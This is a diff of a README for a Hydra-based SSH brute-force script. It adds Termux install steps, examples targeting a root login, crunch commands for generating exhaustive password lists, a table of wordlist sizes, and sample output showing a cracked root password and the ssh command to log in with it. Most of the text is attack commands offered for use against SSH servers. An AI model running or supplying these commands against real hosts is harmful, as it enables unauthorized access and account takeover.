@@ -5,69 +5,111 @@ Quick SSH brute force script using Hydra. Auto-detects if target supports passwo
 ## Install
 
 ```bash
-# Install hydra
-sudo apt install hydra -y
+# Ubuntu/Debian
+sudo apt install hydra crunch -y
 
-# Clone repo
+# Termux
+pkg install hydra crunch -y
+
+# Clone
 git clone https://github.com/keinankairi-afk/ssh-brute.git
 cd ssh-brute
-
-# Make executable
 chmod +x ssh-brute.sh
 ```
 
 ## Usage
 
 ```bash
-./ssh-brute.sh <ip> <user> [wordlist]
+./ssh-brute.sh <ip> <user> [wordlist] [port]
 ```
 
-### Examples
+## Wordlists
+
+| Wordlist | Passwords | Size | Time (est.) |
+|----------|-----------|------|-------------|
+| `all` (default) | 670 | 6KB | Detik |
+| `crunch 6lower` | 308M | 2.1GB | ~1000 jam |
+| `crunch 6alnum` | 2.1B | 15GB | ~7000 jam |
+| rockyou.txt | 14M | 134MB | ~4000 jam |
+| Custom | - | - | - |
+
+## Examples
 
 ```bash
-# Basic - use built-in wordlist
-./ssh-brute.sh 123.123.1.1 root
+# Default — all built-in (670 passwords, detik)
+./ssh-brute.sh 192.168.1.1 root
 
-# Custom user
-./ssh-brute.sh 123.123.1.1 admin
+# Keyboard + name patterns
+./ssh-brute.sh 192.168.1.1 root wordlist-keyboard.txt
+
+# Crunch 6 lowercase (all 6-char combos)
+./ssh-brute.sh 192.168.1.1 root "crunch 6lower"
+
+# Crunch 6 alphanumeric (all 6-char combos)
+./ssh-brute.sh 192.168.1.1 root "crunch 6alnum"
 
 # Custom wordlist
-./ssh-brute.sh 123.123.1.1 root /usr/share/wordlists/rockyou.txt
+./ssh-brute.sh 192.168.1.1 root /path/to/wordlist.txt
 
-# Generate bigger wordlist
-crunch 6 8 abcdefghijklmnopqrstuvwxyz1234567890 -o /tmp/bigwordlist.txt
-./ssh-brute.sh 123.123.1.1 root /tmp/bigwordlist.txt
+# Custom port
+./ssh-brute.sh 192.168.1.1 root all 2222
+
+# rockyou (download separately)
+pkg install wordlists -y
+./ssh-brute.sh 192.168.1.1 root /usr/share/wordlists/rockyou.txt
 ```
 
-## What it does
+## Generate Custom Wordlists
 
-1. **Check** — tests if target supports password authentication
-2. **Wordlist** — uses built-in or custom wordlist
-3. **Attack** — runs hydra with 4 threads
-4. **Report** — shows found credentials
+```bash
+# 6 digit PIN
+crunch 6 6 0123456789 -o pin6.txt
+
+# 8 char lowercase
+crunch 8 8 abcdefghijklmnopqrstuvwxyz -o 8lower.txt
+
+# 8 char mixed
+crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o 8mixed.txt
+
+# Custom charset
+crunch 6 8 "abcdefghijklmnopqrstuvwxyz!@#$" -o custom.txt
+```
 
 ## Output
 
 ```
-=== SSH Brute Force Tester ===
-Target: 123.123.1.1
+=== SSH Brute Force Tester v2.3 ===
+Target: 192.168.1.1:22
 User:   root
 
-[1/3] Checking password auth...
+[*] Using all built-in wordlists
+[1/3] Checking password auth on port 22...
 [+] Password auth supported!
-[2/3] Using wordlist: /tmp/sshpw.txt
-[3/3] Starting brute force (62 passwords)...
+[2/3] Wordlist: 670 passwords
+       Estimated time: ~3min
+[3/3] Starting brute force (timeout 300s)...
 
-[FOUND] host: 123.123.1.1   login: root   password: toor
+╔════════════════════════════════════════════╗
+║  PASSWORD FOUND!                           ║
+╚════════════════════════════════════════════╝
+[FOUND] host: 192.168.1.1   login: root   password: admin123
+[CMD]   ssh -p 22 root@192.168.1.1
+
+=== Scan Complete ===
+Log: /tmp/ssh-brute-20260619-190000.log
 ```
 
-## Custom Wordlists
+## Features
 
-| Wordlist | Source |
-|----------|--------|
-| rockyou.txt | `sudo apt install wordlists` → `/usr/share/wordlists/rockyou.txt` |
-| crunch | `crunch 6 8 abcdefghijklmnopqrstuvwxyz -o wordlist.txt` |
-| SecLists | `git clone https://github.com/danielmiessler/SecLists.git` |
+- ✅ Auto-detect password auth (skip if key-only)
+- ✅ Multiple wordlists (built-in + crunch)
+- ✅ Custom wordlist support
+- ✅ Custom SSH port
+- ✅ Auto-detect Termux (2 threads) vs desktop (4 threads)
+- ✅ Time estimation
+- ✅ Timeout protection (300s default)
+- ✅ Log files (clean + raw)
+- ✅ Works on Termux + Linux
 
 ## Notes
 
